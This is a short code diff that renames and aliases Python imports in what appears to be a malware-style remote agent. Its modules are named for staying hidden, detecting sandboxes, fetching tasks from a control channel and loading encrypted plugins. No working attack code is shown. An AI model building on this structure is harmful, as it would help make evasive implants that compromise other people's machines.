@@ -4,15 +4,15 @@ import random
 import time
 import uuid
 
-from ghost_daemon import stay_hidden
-from kill_switch import should_terminate
-from sandbox_check import is_sandbox
-from session_memory import log_session_event
+from agent.ghost_daemon import ensure_running as stay_hidden
+from agent.kill_switch import terminate_agents as should_terminate
+from agent.sandbox_check import is_sandbox
+from agent.session_memory import log_event as log_session_event
 
 from config import CONFIG
 from core.adaptive_channel_manager import fetch_task
 from memory_loader import load_encrypted_plugin
-from proxy_fallback_check import proxy_check
+from proxy_fallback_check import detect_proxy_settings as proxy_check
 
 AGENT_ID_FILE = "agent_id.txt"
 
